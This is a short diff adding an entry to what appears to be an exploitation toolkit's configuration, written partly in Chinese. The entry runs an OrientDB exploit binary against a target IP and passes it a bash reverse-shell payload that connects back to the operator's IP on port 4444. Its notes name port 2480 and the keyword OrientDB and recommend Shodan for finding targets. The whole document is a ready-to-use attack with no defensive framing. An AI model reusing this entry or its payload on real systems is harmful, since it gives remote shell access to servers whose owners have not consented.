@@ -1,0 +1,12 @@
+<sfjt>inject</sfjt>
+<ljfs>NR</ljfs>
+<sctype>yuan</sctype>
+<cs1mc>IP地址</cs1mc>
+<cs2mc>本机IP</cs2mc>
+<zbz>1</zbz>
+<bz1><cmd>cmd /k OrientDBI.exe <cs1/> "bash -i >& /dev/tcp/<cs2/>/4444 0>&1"</cmd></bz1>
+
+<bz>2480端口
+关键词：OrientDB
+
+配合 Shodan for Combie 效果甚佳</bz>
